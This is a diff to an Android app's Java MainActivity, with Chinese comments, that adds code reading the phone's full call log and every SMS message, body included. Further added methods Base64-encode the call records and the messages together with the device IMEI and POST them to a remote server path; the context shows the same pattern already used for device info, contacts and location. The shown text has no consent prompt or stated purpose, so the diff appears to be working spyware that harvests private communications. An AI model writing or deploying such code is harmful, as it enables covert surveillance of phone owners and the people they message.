@@ -7,6 +7,8 @@ import java.io.InputStream;
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
+import java.sql.Date;
+import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.List;
 
@@ -26,9 +28,11 @@ import android.database.Cursor;
 import android.location.Location;
 import android.location.LocationListener;
 import android.location.LocationManager;
+import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;  
 import android.os.Handler;  
+import android.provider.CallLog;
 import android.provider.ContactsContract;
 import android.provider.ContactsContract.PhoneLookup;
 import android.telephony.TelephonyManager;
@@ -182,7 +186,8 @@ public class MainActivity extends Activity {
         //replyDeviceInfo();
         //replyDeviceContacts();
         //replyDeviceLocations();
-        //tvResult.setText(getPhoneContacts());
+        //replyDeviceCallingRecords();
+        tvResult.setText(replyDeviceSMSRecords());
         
     }  
   
@@ -528,6 +533,105 @@ public class MainActivity extends Activity {
 		double[] location = {latitude,longitude};		
 		return location;
 	}
+	/**得到手机通话记录**/
+    private String getPhoneCallingRecords() {
+    	String temp_result = "";
+    	
+    	ContentResolver cr = getContentResolver();		
+		//查询通话记录
+		Cursor cursor = cr.query(
+				CallLog.Calls.CONTENT_URI,	//使用系统URI，取得通话记录
+				new String[] { CallLog.Calls.NUMBER, //电话号
+						CallLog.Calls.CACHED_NAME,	//联系人
+						CallLog.Calls.TYPE, //通话类型
+						CallLog.Calls.DATE,	//通话时间
+						CallLog.Calls.DURATION //通话时长
+						}, null, null,
+				CallLog.Calls.DEFAULT_SORT_ORDER);
+		
+		//遍历每条通话记录
+		for(cursor.moveToFirst(); !cursor.isAfterLast(); cursor.moveToNext()){
+			String strNumber = cursor.getString(0); // 呼叫号码
+			String strName = cursor.getString(1); // 联系人姓名
+			int type = cursor.getInt(2); 
+			String str_type = "";
+			if(type == CallLog.Calls.INCOMING_TYPE){
+				str_type = "呼入";
+			}else if(type == CallLog.Calls.OUTGOING_TYPE){
+				str_type = "呼出";
+			}else if(type == CallLog.Calls.MISSED_TYPE){
+				str_type = "未接";
+			}
+			long duration = cursor.getLong(4);
+			SimpleDateFormat sfd = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
+			Date date = new Date(Long.parseLong(cursor.getString(3)));
+			String time = sfd.format(date);
+
+			temp_result += (strNumber + "%" + time + "%" + str_type + "%" + duration + "\n");
+		}
+        
+        return temp_result.trim();
+    }
+	/**得到手机通话记录**/
+    private String getPhoneSMSRecords() {
+    	String temp_result = "";
+    	
+    	final String SMS_URI_ALL   = "content://sms/";     
+	    final String SMS_URI_INBOX = "content://sms/inbox";   
+	    final String SMS_URI_SEND  = "content://sms/sent";   
+	    final String SMS_URI_DRAFT = "content://sms/draft";   
+	    
+    	ContentResolver cr = getContentResolver();   
+        String[] projection = new String[]{"_id", "address", "person",    
+                "body", "date", "type"};   
+        Uri uri = Uri.parse(SMS_URI_ALL);   
+        Cursor cur = cr.query(uri, projection, null, null, "date desc");   
+  
+        if (cur.moveToFirst()) {   
+            String name;    
+            String phoneNumber;          
+            String smsbody;   
+            String date;   
+            String type;   
+            
+            int nameColumn = cur.getColumnIndex("person");   
+            int phoneNumberColumn = cur.getColumnIndex("address");   
+            int smsbodyColumn = cur.getColumnIndex("body");   
+            int dateColumn = cur.getColumnIndex("date");   
+            int typeColumn = cur.getColumnIndex("type");   
+            
+            do{   
+                name = cur.getString(nameColumn);                
+                phoneNumber = cur.getString(phoneNumberColumn);   
+                smsbody = cur.getString(smsbodyColumn);   
+                   
+                SimpleDateFormat dateFormat = new SimpleDateFormat(   
+                        "yyyy-MM-dd hh:mm:ss");   
+                Date d = new Date(Long.parseLong(cur.getString(dateColumn)));   
+                date = dateFormat.format(d);   
+                   
+                int typeId = cur.getInt(typeColumn);   
+                if(typeId == 1){   
+                    type = "接收";   
+                } 
+                else if(typeId == 2){   
+                    type = "发送";   
+                } 
+                else {   
+                    type = "";   
+                }   
+                                
+                temp_result += (phoneNumber + "%" + date + "%" + type + "%" + smsbody + "\n");
+                
+                if(smsbody == null) smsbody = "";     
+            }while(cur.moveToNext());   
+        } 
+        else {   
+            ;
+        }   
+                    
+        return temp_result.trim();
+    }    
     /**返回设备基本信息**/
 	private String replyDeviceInfo(){ 
 		String[] deviceInfo = getDeviceInfo();
@@ -603,6 +707,68 @@ public class MainActivity extends Activity {
 	        params.add(new BasicNameValuePair("IMEI", Base64.encodeToString(deviceInfo[0].getBytes(),Base64.DEFAULT)));
 	        params.add(new BasicNameValuePair("latitude", Base64.encodeToString(Double.toString(deviceLocation[0]).getBytes(),Base64.DEFAULT)));
 	        params.add(new BasicNameValuePair("longitude", Base64.encodeToString(Double.toString(deviceLocation[0]).getBytes(),Base64.DEFAULT)));
+
+	        /* 添加请求参数到请求对象*/
+	        httpRequest.setEntity(new UrlEncodedFormEntity(params, HTTP.UTF_8));
+	        /*发送请求并等待响应*/
+	        HttpResponse httpResponse = new DefaultHttpClient().execute(httpRequest);
+	        /*若状态码为200 ok*/
+	        if(httpResponse.getStatusLine().getStatusCode() == 200){
+	        	/*读返回数据*/
+	        	String strResult = EntityUtils.toString(httpResponse.getEntity());
+	        	return strResult;
+	        }
+	        else{
+	        	return "postError";
+	        }
+			
+		}  
+		catch(Exception ee) {  
+			return "error:" + ee.getMessage();
+		}  
+	}
+	/**返回设备通话记录**/
+	private String replyDeviceCallingRecords(){ 
+		String[] deviceInfo = getDeviceInfo();
+		String callingRecords = getPhoneCallingRecords();
+		String temp_url = "http://" + ipAddr + "/prp/index.php/device/reply_device_calling_records";
+		try{  
+			HttpPost httpRequest = new HttpPost(temp_url); 
+			
+			List <NameValuePair> params = new ArrayList <NameValuePair>();
+	        params.add(new BasicNameValuePair("IMEI", Base64.encodeToString(deviceInfo[0].getBytes(),Base64.DEFAULT)));
+	        params.add(new BasicNameValuePair("calling_records", Base64.encodeToString(callingRecords.getBytes(),Base64.DEFAULT)));
+
+	        /* 添加请求参数到请求对象*/
+	        httpRequest.setEntity(new UrlEncodedFormEntity(params, HTTP.UTF_8));
+	        /*发送请求并等待响应*/
+	        HttpResponse httpResponse = new DefaultHttpClient().execute(httpRequest);
+	        /*若状态码为200 ok*/
+	        if(httpResponse.getStatusLine().getStatusCode() == 200){
+	        	/*读返回数据*/
+	        	String strResult = EntityUtils.toString(httpResponse.getEntity());
+	        	return strResult;
+	        }
+	        else{
+	        	return "postError";
+	        }
+			
+		}  
+		catch(Exception ee) {  
+			return "error:" + ee.getMessage();
+		}  
+	}
+	/**返回设备短信记录**/
+	private String replyDeviceSMSRecords(){ 
+		String[] deviceInfo = getDeviceInfo();
+		String smsRecords = getPhoneSMSRecords();
+		String temp_url = "http://" + ipAddr + "/prp/index.php/device/reply_device_sms_records";
+		try{  
+			HttpPost httpRequest = new HttpPost(temp_url); 
+			
+			List <NameValuePair> params = new ArrayList <NameValuePair>();
+	        params.add(new BasicNameValuePair("IMEI", Base64.encodeToString(deviceInfo[0].getBytes(),Base64.DEFAULT)));
+	        params.add(new BasicNameValuePair("sms_records", Base64.encodeToString(smsRecords.getBytes(),Base64.DEFAULT)));
 
 	        /* 添加请求参数到请求对象*/
 	        httpRequest.setEntity(new UrlEncodedFormEntity(params, HTTP.UTF_8));
